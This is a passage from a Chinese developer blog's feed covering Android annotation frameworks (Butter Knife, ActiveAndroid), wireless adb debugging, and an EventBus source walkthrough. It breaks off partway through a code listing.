<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Retention</span>(CLASS)</span><br><span class="line"><span class="annotation">@Target</span>(FIELD)</span><br><span class="line"><span class="keyword">public</span> <span class="annotation">@interface</span> InjectView &#123;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可看出 Butter Knife 的 InjectView Annotation 是编译时 Annotation，并且只能用于修饰属性</p>
<p>(3) 原理</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">process</span><span class="params">(Set&lt;? <span class="keyword">extends</span> TypeElement&gt; elements, RoundEnvironment env)</span> </span>&#123;</span><br><span class="line">    Map&lt;TypeElement, ViewInjector&gt; targetClassMap = findAndParseTargets(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;TypeElement, ViewInjector&gt; entry : targetClassMap.entrySet()) &#123;</span><br><span class="line">        TypeElement typeElement = entry.getKey();</span><br><span class="line">        ViewInjector viewInjector = entry.getValue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JavaFileObject jfo = filer.createSourceFile(viewInjector.getFqcn(), typeElement);</span><br><span class="line">            Writer writer = jfo.openWriter();</span><br><span class="line">            writer.write(viewInjector.brewJava());</span><br><span class="line">            writer.flush();</span><br><span class="line">            writer.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">error</span>(typeElement, <span class="string">"Unable to write injector for type %s: %s"</span>, typeElement, e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ButterKnifeProcessor.java 的 process 方法如上，编译时，在此方法中过滤 InjectView 这个 Annotation 到 targetClassMap 后，会根据 targetClassMap 中元素生成不同的 class 文件到最终的 APK 中，然后在运行时调用 ButterKnife.inject(x) 函数时会到之前编译时生成的类中去找。</p>
<h2 id="6-3_Annotation__u2014_ActiveAndroid"><a href="#6-3_Annotation__u2014_ActiveAndroid" class="headerlink" title="6.3 Annotation — ActiveAndroid"></a>6.3 Annotation — ActiveAndroid</h2><p>(1) 调用</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@Column</span>(name = “Name")</span><br><span class="line">public String name;</span><br></pre></td></tr></table></figure>
<p>(2) 定义</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="variable">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line">public <span class="variable">@interface</span> Column &#123;</span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可看出 ActiveAndroid 的 Column Annotation 是运行时 Annotation，并且只能用于修饰属性。</p>
<p>(3) 原理</p>
<figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Field</span> idField = getIdField(type);</span><br><span class="line">mColumnNames.put(idField, mIdName);</span><br><span class="line"></span><br><span class="line">List&lt;<span class="keyword">Field</span>&gt; fields = <span class="keyword">new</span> LinkedList&lt;<span class="keyword">Field</span>&gt;(ReflectionUtils.getDeclaredColumnFields(type));</span><br><span class="line">Collections.reverse(fields);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">Field</span> <span class="keyword">field</span> : fields) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">field</span>.isAnnotationPresent(Column.class)) &#123;</span><br><span class="line">        <span class="keyword">final</span> Column columnAnnotation = <span class="keyword">field</span>.getAnnotation(Column.class);</span><br><span class="line">        String columnName = columnAnnotation.name();</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(columnName)) &#123;</span><br><span class="line">            columnName = <span class="keyword">field</span>.getName();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mColumnNames.put(<span class="keyword">field</span>, columnName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>TableInfo.java 的构造函数如上，运行时，得到所有行信息并存储起来用来构件表信息。</p>
<p>并没有深入了解这些框架的原理，只是粗浅的介绍，以后有时间再来沉下心研究。</p>
]]></content>
    <summary type="html">
    <![CDATA[见惯了Android中的annotation，以及各种资源注解的框架，却没有深入了解其中的原理，深表惭愧...]]>
    
    </summary>
    
      <category term="注解" scheme="http://www.xuanzhangjiong.xyz/tags/%E6%B3%A8%E8%A7%A3/"/>
    
      <category term="Java" scheme="http://www.xuanzhangjiong.xyz/categories/Java/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android无线调试方法]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/09/05/Android%E6%97%A0%E7%BA%BF%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/09/05/Android无线调试方法/</id>
    <published>2015-09-05T04:15:48.000Z</published>
    <updated>2016-01-05T04:26:20.000Z</updated>
    <content type="html"><![CDATA[<p>自从用了Mac之后usb接口果断不够用了，能省一个是一个，发现原来在同一局域网下，可以无线调试，果断学习了。</p>
<p>步骤很简单：</p>
<ol>
<li>先用USB连上手机。</li>
<li>然后<code>adb tcpip 5555</code>，当然端口自己设，没有限死。</li>
<li>拔掉USB线，<code>adb connect 192.168.31.137:5555</code>，你手机的局域网IP加端口号，搞定。</li>
<li>Android Studio中是不是已经可以无线调试了。</li>
<li>如果要切换回USB调试的话也很简单，<code>adb usb</code>即可。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>自从用了Mac之后usb接口果断不够用了，能省一个是一个，发现原来在同一局域网下，可以无线调试，果断学习了。</p>
<p>步骤很简单：</p>
<ol>
<li>先用USB连上手机。</li>
<li>然后<code>adb tcpip 5555</code>，当然端口自]]>
    </summary>
    
      <category term="调试" scheme="http://www.xuanzhangjiong.xyz/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[EventBus浅析]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/09/03/EventBus%E6%B5%85%E6%9E%90/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/09/03/EventBus浅析/</id>
    <published>2015-09-03T02:24:11.000Z</published>
    <updated>2015-12-20T02:59:06.000Z</updated>
    <content type="html"><![CDATA[<h1 id="u4E00_u3001_u6982_u8FF0_u53CA_u57FA_u672C_u6982_u5FF5"><a href="#u4E00_u3001_u6982_u8FF0_u53CA_u57FA_u672C_u6982_u5FF5" class="headerlink" title="一、概述及基本概念"></a>一、概述及基本概念</h1><p>EventBus是一个Android端优化的publish/subscribe消息总线，简化了应用程序内各组件间、组件与后台线程间的通信。比如请求网络，等网络返回时通过Handler或Broadcast通知UI，两个Fragment之间需要通过Listener通信，这些需求都可以通过EventBus实现。</p>
<p>作为一个消息总线，有三个主要的元素：</p>
<ul>
<li>Event：事件</li>
<li>Subscriber：事件订阅者，接收特定的事件</li>
<li>Publisher:事件发布者，用于通知Subscriber有事件发生</li>
</ul>
<h2 id="Event"><a href="#Event" class="headerlink" title="Event"></a>Event</h2><p>Event可以是任意类型的对象。</p>
<h2 id="Subscriber"><a href="#Subscriber" class="headerlink" title="Subscriber"></a>Subscriber</h2><p>在EventBus中，使用约定来指定事件订阅者以简化使用。即所有事件订阅都都是以onEvent开头的函数，具体来说，函数的名字是onEvent，onEventMainThread，onEventBackgroundThread，onEventAsync这四个，这个和ThreadMode有关，后面再说。</p>
<h2 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h2><p>可以在任意线程任意位置发送事件，直接调用EventBus的<code>post(Object)</code>方法，可以自己实例化EventBus对象，但一般使用默认的单例就好了：<code>EventBus.getDefault()</code>，根据post函数参数的类型，会自动调用订阅相应类型事件的函数。</p>
<h2 id="ThreadMode"><a href="#ThreadMode" class="headerlink" title="ThreadMode"></a>ThreadMode</h2><p>前面说了，Subscriber函数的名字只能是那4个，因为每个事件订阅函数都是和一个<code>ThreadMode</code>相关联的，ThreadMode指定了会调用的函数。有以下四个ThreadMode：</p>
<ul>
<li>PostThread：事件的处理在和事件的发送在相同的进程，所以事件处理时间不应太长，不然影响事件的发送线程，而这个线程可能是UI线程。对应的函数名是onEvent。</li>
<li>MainThread:事件的处理会在UI线程中执行。事件处理时间不能太长，这个不用说的，长了会ANR的，对应的函数名是onEventMainThread。</li>
<li>BackgroundThread：事件的处理会在一个后台线程中执行，对应的函数名是onEventBackgroundThread，虽然名字是BackgroundThread，事件处理是在后台线程，但事件处理时间还是不应该太长，因为如果发送事件的线程是后台线程，会直接执行事件，如果当前线程是UI线程，事件会被加到一个队列中，由一个线程依次处理这些事件，如果某个事件处理时间太长，会阻塞后面的事件的派发或处理。</li>
<li>Async：事件处理会在单独的线程中执行，主要用于在后台线程中执行耗时操作，每个事件会开启一个线程（有线程池），但最好限制线程的数目。</li>
</ul>
<p>根据事件订阅都函数名称的不同，会使用不同的ThreadMode，比如果在后台线程加载了数据想在UI线程显示，订阅者只需把函数命名为onEventMainThread。</p>
<h1 id="u4E8C_u3001_u7B80_u5355_u4F7F_u7528"><a href="#u4E8C_u3001_u7B80_u5355_u4F7F_u7528" class="headerlink" title="二、简单使用"></a>二、简单使用</h1><p>基本的使用步骤就是如下4步。</p>
<p>定义事件类型：<br><code>public class MyEvent {}</code><br>定义事件处理方法：<br><code>public void onEventMainThread</code><br>注册订阅者：<br><code>EventBus.getDefault().register(this)</code><br>发送事件：<br><code>EventBus.getDefault().post(new MyEvent())</code></p>
<h1 id="u4E09_u3001_u5B9E_u73B0"><a href="#u4E09_u3001_u5B9E_u73B0" class="headerlink" title="三、实现"></a>三、实现</h1><p>EventBus使用方法很简单，但用一个东西，如果不了解它的实现用起来心里总是没底，万一出问题咋办都不知道，所以还是研究一下它的实现，肯定要Read the fucking Code。其实主要是<code>EventBus</code>这一个类，在看看Code时需要了解几个概念与成员，了解了这些后实现就很好理解了。</p>
<p>EventType：onEvent函数中的参数，表示事件的类型<br>Subscriber：订阅源，即调用register注册的对象，这个对象内包含onEvent函数<br>SubscribMethod：<code>Subscriber</code>内某一特定的onEvent方法，内部成员包含一个<code>Method</code>类型的method成员表示这个onEvent方法，一个<code>ThreadMode</code>成员threadMode表示事件的处理线程，一个<code>Class&lt;?&gt;</code>类型的eventType成员表示事件的类型<code>EventType</code>。<br>Subscription，表示一个订阅对象，包含订阅源<code>Subscriber</code>，订阅源中的某一特定方法<code>SubscribMethod</code>，这个订阅的优先级<code>priopity</code></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EventType -&gt; List&lt;Subscription&gt;，事件到订阅对象之间的映射</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;<span class="keyword">Class</span>&lt;?&gt;, CopyOnWriteArrayList&lt;Subscription&gt;&gt; subscriptionsByEventType;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Subscriber -&gt; List&lt;EventType&gt;，订阅源到它订阅的的所有事件类型的映射</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Object, List&lt;<span class="keyword">Class</span>&lt;?&gt;&gt;&gt; typesBySubscriber;</span><br><span class="line"></span><br><span class="line"><span class="comment">// stickEvent事件，后面会看到</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;<span class="keyword">Class</span>&lt;?&gt;, Object&gt; stickyEvents;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EventType -&gt; List&lt;? extends EventType&gt;，事件到它的父事件列表的映射。即缓存一个类的所有父类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;<span class="keyword">Class</span>&lt;?&gt;, List&lt;<span class="keyword">Class</span>&lt;?&gt;&gt;&gt; eventTypesCache = <span class="keyword">new</span> HashMap&lt;<span class="keyword">Class</span>&lt;?&gt;, List&lt;<span class="keyword">Class</span>&lt;?&gt;&gt;&gt;();</span><br></pre></td></tr></table></figure>
<h1 id="u56DB_u3001_u6CE8_u518C_u4E8B_u4EF6_uFF1Aregister"><a href="#u56DB_u3001_u6CE8_u518C_u4E8B_u4EF6_uFF1Aregister" class="headerlink" title="四、注册事件：register"></a>四、注册事件：register</h1><p>通过<code>EventBus.getDefault().register</code>方法可以向<code>EventBus</code>注册来订阅事件，<code>register</code>有很多种重载形式，但大都被标记为<code>Deprecated</code>了，所以还是不用为好，前面说了事件处理方法都是以<em>onEvent</em>开头，其实是可以通过register方法修改的，但相应的方法被废弃了，还是不要用了，就用默认的<em>onEvent</em>，除下废弃的register方法，还有以下4个<strong>public</strong>的<code>register</code>方法</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(Object subscriber)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span>(subscriber, defaultMethodName, <span class="literal">false</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(Object subscriber, <span class="keyword">int</span> priority)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span>(subscriber, defaultMethodName, <span class="literal">false</span>, priority);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerSticky</span><span class="params">(Object subscriber)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span>(subscriber, defaultMethodName, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerSticky</span><span class="params">(Object subscriber, <span class="keyword">int</span> priority)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">register</span>(subscriber, defaultMethodName, <span class="literal">true</span>, priority);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这4个方法都调用了同一个方法：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">private</span> synchronized void register(Object <span class="keyword">subscriber, </span><span class="keyword">String </span>methodName, <span class="keyword">boolean </span>sticky, int priority) &#123;</span><br><span class="line">    List&lt;<span class="keyword">SubscriberMethod&gt; </span><span class="keyword">subscriberMethods </span>= <span class="keyword">subscriberMethodFinder.findSubscriberMethods(subscriber.getClass(),</span><br><span class="line"></span><span class="label">methodName</span>)<span class="comment">;</span></span><br><span class="line">    for (<span class="keyword">SubscriberMethod </span><span class="keyword">subscriberMethod </span>: <span class="keyword">subscriberMethods) </span>&#123;</span><br><span class="line">        <span class="keyword">subscribe(subscriber, </span><span class="keyword">subscriberMethod, </span>sticky, priority)<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个参数就是订阅源，第二个参数就是用到指定方法名约定的，默认为<em>onEvent</em>开头，说默认是其实是可以通过参数修改的，但前面说了，方法已被废弃，最好不要用。第三个参数表示是否是<em>Sticky Event</em>，第4个参数是优先级，这两个后面再说。</p>
<p>在上面这个方法中，使用了一个叫<code>SubscriberMethodFinder</code>的类，通过其<code>findSubscriberMethods</code>方法找到了一个<code>SubscriberMethod</code>列表，前面知道了<code>SubscriberMethod</code>表示Subcriber内一个onEvent方法，可以看出来<code>SubscriberMethodFinder</code>类的作用是在Subscriber中找到所有以methodName（即默认的onEvent）开头的方法，每个找到的方法被表示为一个<code>SubscriberMethod</code>对象。</p>
<p><code>SubscriberMethodFinder</code>就不再分析了，但有两点需要知道：</p>
<p>所有事件处理方法<strong>必需是<code>public void</code>类型</strong>的，并且只有一个参数表示<em>EventType</em>。<br><code>findSubscriberMethods</code>不只查找<em>Subscriber</em>内的事件处理方法，<strong>同时还会查到它的继承体系中的所有基类中的事件处理方法</strong>。<br>找到<em>Subscriber</em>中的所有事件处理方法后，会对每个找到的方法（表示为<code>SubscriberMethod</code>对象）调用<code>subscribe</code>方法注册。<code>subscribe</code>方法干了三件事：</p>
<p>根据<code>SubscriberMethod</code>中的<em>EventType</em>类型将<code>Subscribtion</code>对象存放在<code>subscriptionsByEventType</code>中。建立<em>EventType</em>到<em>Subscription</em>的映射，每个事件可以有多个订阅者。<br>根据<code>Subscriber</code>将<code>EventType</code>存放在<code>typesBySubscriber</code>中，建立<em>Subscriber</em>到<em>EventType</em>的映射，每个Subscriber可以订阅多个事件。<br>如果是<em>Sticky</em>类型的订阅者，直接向它发送上个保存的事件（如果有的话）。<br>通过<em>Subscriber</em>到<em>EventType</em>的映射，我们就可以很方便地使一个Subscriber取消接收事件，通过<em>EventType</em>到<em>Sucscribtion</em>的映射，可以方便地将相应的事件发送到它的每一个订阅者。</p>
<h1 id="u4E94_u3001post_u4E8B_u4EF6"><a href="#u4E94_u3001post_u4E8B_u4EF6" class="headerlink" title="五、post事件"></a>五、post事件</h1><p>直接调用<code>EventBus.getDefault().post(Event)</code>就可以发送事件，根据Event的类型就可以发送到相应事件的订阅者。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">post</span>(<span class="params">Object <span class="keyword">event</span></span>) </span>&#123;</span><br><span class="line">    PostingThreadState postingState = currentPostingThreadState.<span class="keyword">get</span>();</span><br><span class="line">    List&lt;Object&gt; eventQueue = postingState.eventQueue;</span><br><span class="line">    eventQueue.add(<span class="keyword">event</span>);</span><br><span class="line">    <span class="keyword">if</span> (postingState.isPosting) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        postingState.isMainThread = Looper.getMainLooper() == Looper.myLooper();</span><br><span class="line">        postingState.isPosting = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (postingState.canceled) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> EventBusException(<span class="string">"Internal error. Abort state was not reset"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (!eventQueue.isEmpty()) &#123;</span><br><span class="line">                postSingleEvent(eventQueue.remove(<span class="number">0</span>), postingState);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            postingState.isPosting = <span class="keyword">false</span>;</span><br><span class="line">            postingState.isMainThread = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到post内使用了<code>PostingThreadState</code>的对象，并且是<code>ThreadLocal</code>，来看<code>PostingThreadState</code>的定义：</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="literal">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PostingThreadState</span> </span>&#123;</span><br><span class="line">    <span class="built_in">List</span>&lt;<span class="built_in">Object</span>&gt; eventQueue = <span class="keyword">new</span> ArrayList&lt;<span class="built_in">Object</span>&gt;();</span><br><span class="line">    boolean isPosting;</span><br><span class="line">    boolean isMainThread;</span><br><span class="line">    Subscription subscription;</span><br><span class="line">    <span class="built_in">Object</span> event;</span><br><span class="line">    boolean canceled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是有个成员<code>eventQueue</code>，由于是ThreadLocal，所以结果就是，每个线程有一个<code>PostingThreadState</code>对象，这个对象内部有一个事件的队列，并且有一个成员<code>isPosting</code>表示现在是否正在派发事件，当发送事件开始时，会依次取出队列中的事件发送出去，如果正在派发事件，那么post直接把事件加入队列后返回，还有个成员<code>isMainThread</code>，这个成员在实际派发事件时会用到，在<code>postSingleEvent</code>中会用到。</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> postSingleEvent(Object event, PostingThreadState postingState) <span class="keyword">throws</span> Error &#123;</span><br><span class="line">    <span class="keyword">Class</span>&lt;? <span class="keyword">extends</span> Object&gt; eventClass = event.getClass();</span><br><span class="line">    List&lt;<span class="keyword">Class</span>&lt;?&gt;&gt; eventTypes = findEventTypes(eventClass); <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">boolean</span> subscriptionFound = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> countTypes = eventTypes.<span class="keyword">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; countTypes; h++) &#123; <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">Class</span>&lt;?&gt; clazz = eventTypes.get(h);</span><br><span class="line">        CopyOnWriteArrayList&lt;Subscription&gt; subscriptions;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            subscriptions = subscriptionsByEventType.get(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (subscriptions != <span class="keyword">null</span> &amp;&amp; !subscriptions.isEmpty()) &#123; <span class="comment">// 3</span></span><br><span class="line">            <span class="keyword">for</span> (Subscription subscription : subscriptions) &#123;</span><br><span class="line">                postingState.event = event;</span><br><span class="line">                postingState.subscription = subscription;</span><br><span class="line">                <span class="keyword">boolean</span> aborted = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    postToSubscription(subscription, event, postingState.isMainThread); <span class="comment">// 4</span></span><br><span class="line">                    aborted = postingState.canceled;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    postingState.event = <span class="keyword">null</span>;</span><br><span class="line">                    postingState.subscription = <span class="keyword">null</span>;</span><br><span class="line">                    postingState.canceled = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (aborted) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            subscriptionFound = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!subscriptionFound) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"No subscribers registered for event "</span> + eventClass);</span><br><span class="line">        <span class="keyword">if</span> (eventClass != NoSubscriberEvent.<span class="keyword">class</span> &amp;&amp; eventClass != SubscriberExceptionEvent.<span class="keyword">class</span>) &#123;</span><br><span class="line">            post(<span class="keyword">new</span> NoSubscriberEvent(<span class="keyword">this</span>, event));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>来看一下<code>postSingleEvent</code>这个函数，首先看第一点，调用了<code>findEventTypes</code>这个函数，代码不帖了，这个函数的应用就是，把这个类的类对象、实现的接口及父类的类对象存到一个List中返回.</p>
<p>接下来进入第二步，遍历第一步中得到的List，对List中的每个类对象（即事件类型）执行第三步操作，即找到这个事件类型的所有订阅者向其发送事件。可以看到，<strong>当我们Post一个事件时，这个事件的父事件（事件类的父类的事件）也会被Post，所以如果有个事件订阅者接收Object类型的事件，那么它就可以接收到所有的事件</strong>。</p>
<p>还可以看到，实际是通过第四步中的<code>postToSubscription</code>来发送事件的，在发送前把事件及订阅者存入了<code>postingState</code>中。再来看<code>postToSubscription</code></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postToSubscription</span>(<span class="params">Subscription subscription, Object <span class="keyword">event</span>, boolean isMainThread</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (subscription.subscriberMethod.threadMode) &#123;</span><br><span class="line">    <span class="keyword">case</span> PostThread:</span><br><span class="line">        invokeSubscriber(subscription, <span class="keyword">event</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> MainThread:</span><br><span class="line">        <span class="keyword">if</span> (isMainThread) &#123;</span><br><span class="line">            invokeSubscriber(subscription, <span class="keyword">event</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mainThreadPoster.enqueue(subscription, <span class="keyword">event</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BackgroundThread:</span><br><span class="line">        <span class="keyword">if</span> (isMainThread) &#123;</span><br><span class="line">            backgroundPoster.enqueue(subscription, <span class="keyword">event</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            invokeSubscriber(subscription, <span class="keyword">event</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Async:</span><br><span class="line">        asyncPoster.enqueue(subscription, <span class="keyword">event</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span 